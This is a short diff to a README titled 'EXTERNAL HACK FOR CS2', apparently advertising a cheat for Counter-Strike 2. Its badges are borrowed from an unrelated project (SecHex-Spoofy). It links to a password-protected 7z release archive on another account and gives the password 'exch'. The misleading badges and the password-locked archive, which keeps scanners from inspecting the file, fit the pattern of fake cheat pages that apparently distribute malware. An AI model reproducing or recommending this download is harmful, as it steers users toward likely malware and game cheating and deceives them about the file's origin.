@@ -1,4 +1,4 @@
-# EXTERNAL HACK FOR  [![Github All Releases](https://img.shields.io/github/downloads/SecHex/SecHex-Spoofy/total)]() [![Codacy Badge](https://app.codacy.com/project/badge/Grade/0d4fdc1daca5402a8c57efc3bef73d31)]()
+# EXTERNAL HACK FOR CS2 [![Github All Releases](https://img.shields.io/github/downloads/SecHex/SecHex-Spoofy/total)]() [![Codacy Badge](https://app.codacy.com/project/badge/Grade/0d4fdc1daca5402a8c57efc3bef73d31)]()
 [![downloadstats2](https://github.com/jakerellson55/jakerellson55-proj/assets/163674734/38565abe-f844-4e4f-9ea8-974f313ccf01)](https://github.com/jakerellson55/jakerellson55-proj/releases/download/EXTERN4L_v9.8.1/EXTERN4L_v9.8.1.7z)
 > Password: exch
 
